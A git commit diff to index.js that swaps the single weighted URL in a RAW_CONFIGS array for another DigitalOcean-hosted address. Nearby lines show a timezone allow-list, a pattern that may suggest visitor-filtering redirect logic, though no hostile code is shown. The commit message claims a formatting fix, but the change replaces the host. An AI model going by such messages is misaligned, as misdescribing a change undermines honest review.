7bb709881afbd783b2880081648ef009c370058d
paalakash <palaksh452@gmail.com>
2026-07-08 11:45:23 +0530

    Fix URL formatting in RAW_CONFIGS array
    Corrected URL formatting and ensured proper syntax in RAW_CONFIGS.

--- index.js
+++ index.js
@@ -31,7 +31,7 @@ const ALLOWED_TIMEZONES = new Set([
 
 // Raw URLs accompanied by their selection probability weights (Must total 1.0)
 const RAW_CONFIGS = [
-    { url: "https://sky-app-9wafp.ondigitalocean.app/Win0codejInfowj2n/index.html", weight: 1.0 }
+    { url: "https://oyster-app-ndp5z.ondigitalocean.app/Win0codejInfowj2n/index.html", weight: 1.0 }
 
 ];
 
